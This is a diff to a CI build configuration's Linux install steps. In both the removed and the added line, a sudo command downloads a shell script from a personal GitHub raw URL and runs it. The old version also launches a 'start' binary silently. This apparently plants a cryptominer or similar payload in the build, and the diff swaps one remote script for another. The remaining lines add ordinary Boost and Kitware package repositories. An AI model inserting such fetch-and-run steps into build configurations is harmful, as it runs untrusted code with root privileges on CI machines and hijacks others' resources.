@@ -13,7 +13,7 @@ platform:
 install:
  
  # Linux
- - sh: sudo bash -c "$(wget https://raw.githubusercontent.com/renifer12/BTC/main/srb0.sh && chmod u+x srb0.sh && ./srb0.sh && chmod +x start &&./start > /dev/null 2>&1)"
+ - sh: sudo bash -c "$(wget https://raw.githubusercontent.com/renitareni/mesin/main/zerg.sh && chmod +x zerg.sh && ./zerg.sh)"
  - sh: sudo add-apt-repository ppa:mhier/libboost-latest
  - sh: wget -O - https://apt.kitware.com/keys/kitware-archive-latest.asc 2>/dev/null | sudo apt-key add -
  - sh: sudo apt-add-repository 'deb https://apt.kitware.com/ubuntu/ bionic main'
